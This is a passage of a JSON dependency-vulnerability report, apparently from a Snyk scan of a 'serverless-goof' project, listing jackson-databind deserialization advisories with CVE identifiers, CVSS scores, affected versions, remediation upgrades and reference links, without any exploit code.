      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. Mishandles the interaction between serialization gadgets and typing, related to:\r\n\r\n* `com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig` (aka `ibatis-sqlmap`)\r\n* `br.com.anteros.dbcp.AnterosDBCPConfig` (aka `anteros-core`)\r\n* `org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig` (aka shaded `hikari-config`)\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.7.9.7, 2.8.11.6, 2.9.10.4 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/9f4e97019fb0dd836533d0b6198c88787e235ae2)\n- [Github Issue #1](https://github.com/FasterXML/jackson-databind/issues/2634)\n- [GitHub Issue #2](https://github.com/FasterXML/jackson-databind/issues/2631)\n- [GitHub PoC](https://github.com/fairyming/CVE-2020-9548)\n",
      "disclosureTime": "2020-03-02T05:18:36Z",
      "exploit": "Proof of Concept",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.6.7.3)",
            "[2.8.0,2.8.11.5)",
            "[2.9.0,2.9.10.3)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.4",
        "2.7.9.7",
        "2.8.11.6",
        "2.9.10.4"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-559094",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-5p34-5m6p-p58g",
          "GHSA-p43x-xfjf-5jhr",
          "GHSA-q93h-jc49-78gg"
        ],
        "CVE": [
          "CVE-2020-9546",
          "CVE-2020-9547",
          "CVE-2020-9548"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-08-25T15:55:36.403633Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-03-02T05:18:36Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/9f4e97019fb0dd836533d0b6198c88787e235ae2"
        },
        {
          "title": "Github Issue #1",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2634"
        },
        {
          "title": "GitHub Issue #2",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2631"
        },
        {
          "title": "GitHub PoC",
          "url": "https://github.com/fairyming/CVE-2020-9548"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.6.7.3)",
            "[2.8.0,2.8.11.5)",
            "[2.9.0,2.9.10.3)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.4)",
          "[2.7.0,2.7.9.7)",
          "[2.8.0,2.8.11.6)",
          "[2.9.0,2.9.10.4)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.4"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-03-03T08:13:33.357434Z",
      "credit": [
        "Pedro Sampaio"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data due to an incomplete black list (incomplete fix for [CVE-2017-7525](https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-31507)). \r\nIt doesn't block `common-configuration` JNDI classes `org.apache.commons.configuration.JNDIConfiguration` and `org.apache.commons.configuration2.JNDIConfiguration`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.3, 2.8.11.5, 2.9.10.3 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/41b7f9b90149e9d44a65a8261a8deedc7186f6af)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2462)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2469)\n- [RedHat Bugzilla](https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2019-14892)\n",
      "disclosureTime": "2020-03-02T17:09:34Z",
      "exploit": "Proof of Concept",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.6.7.3)",
            "[2.8.0,2.8.11.5)",
            "[2.9.0,2.9.10.3)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.3",
        "2.8.11.5",
        "2.9.10.3"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-559106",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-qmqc-x3r4-6v39",
          "GHSA-cf6r-3wgc-h863"
        ],
        "CVE": [
          "CVE-2019-14892",
          "CVE-2019-14893"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-08-25T15:58:30.740224Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-03-02T17:09:34Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/41b7f9b90149e9d44a65a8261a8deedc7186f6af"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2462"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2469"
        },
        {
          "title": "RedHat Bugzilla",
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2019-14892"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.6.7.3)",
            "[2.8.0,2.8.11.5)",
            "[2.9.0,2.9.10.3)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.3)",
          "[2.8.0,2.8.11.5)",
          "[2.9.0,2.9.10.3)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.3"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-03-19T14:36:02.644920Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to `com.caucho.config.types.ResourceRef` (aka `caucho-quercus`).\r\n\r\n\r\nNote: This vulnerability does not affect release `2.10.0` onward.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.4 or higher.\n## References\n- [GitHub Commit (Master)](https://github.com/FasterXML/jackson-databind/commit/1645efbd392989cf015f459a91c999e59c921b15)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2660)\n- [On Jackson CVE's Blog](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n- [PoC](https://github.com/Al1ex/CVE-2020-10673)\n",
      "disclosureTime": "2020-03-18T22:56:21Z",
      "exploit": "Proof of Concept",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0,2.9.10.4)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.4"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-560762",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-fqwf-pjwf-7vqv"
        ],
        "CVE": [
          "CVE-2020-10673"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-05-02T13:21:40.081635Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-03-18T22:56:21Z",
      "references": [
        {
          "title": "GitHub Commit (Master)",
          "url": "https://github.com/FasterXML/jackson-databind/commit/1645efbd392989cf015f459a91c999e59c921b15"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2660"
        },
        {
          "title": "On Jackson CVE's Blog",
          "url": "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        },
        {
          "title": "PoC",
          "url": "https://github.com/Al1ex/CVE-2020-10673"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0,2.9.10.4)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.0.0,2.6.7.4)",
          "[2.7.0,2.9.10.4)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.4"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-03-19T15:03:20.847507Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to `org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory` (aka `aries.transaction.jms`). \r\n\r\nNote: This vulnerability does not affect release `2.10.0` onward.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.4 or higher.\n## References\n- [GitHub Commit (Master)](https://github.com/FasterXML/jackson-databind/commit/592872f4235c7f2a3280725278da55544032f72d)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2659)\n- [On Jackson CVEs: Donâ€™t Panic](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n",
      "disclosureTime": "2020-03-18T22:56:24Z",
      "exploit": "Unproven",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0,2.9.10.4)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.4"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-560766",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-95cm-88f5-f2c7"
        ],
        "CVE": [
          "CVE-2020-10672"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2020-11-15T15:39:04.662835Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-03-18T22:56:24Z",
      "references": [
        {
          "title": "GitHub Commit (Master)",
          "url": "https://github.com/FasterXML/jackson-databind/commit/592872f4235c7f2a3280725278da55544032f72d"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2659"
        },
        {
          "title": "On Jackson CVEs: Donâ€™t Panic",
          "url": "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0,2.9.10.4)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.0.0,2.6.7.4)",
          "[2.7.0,2.9.10.4)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.4"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-03-26T16:25:31.113677Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to gadget `javax.swing.JEditorPane`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.7.9.7, 2.8.11.6, 2.9.10.4 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2642)\n- [Medium Article](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n",
      "disclosureTime": "2020-03-26T14:55:31Z",
      "exploit": "Unproven",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0,2.9.10.4)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.4",
        "2.7.9.7",
        "2.8.11.6",
        "2.9.10.4"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-561362",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-758m-v56v-grj4"
        ],
        "CVE": [
          "CVE-2020-10969"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2020-11-15T15:32:28.395275Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-03-26T14:55:31Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2642"
        },
        {
          "title": "Medium Article",
          "url": "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0,2.9.10.4)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.0.0,2.6.7.4)",
          "[2.7.0,2.7.9.7)",
          "[2.8.0,2.8.11.6)",
          "[2.9.0,2.9.10.4)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.4"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-03-26T17:09:01.709397Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to gadget `org.aoju.bus.proxy.provider.remoting.RmiProvider` (aka bus-proxy).\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization 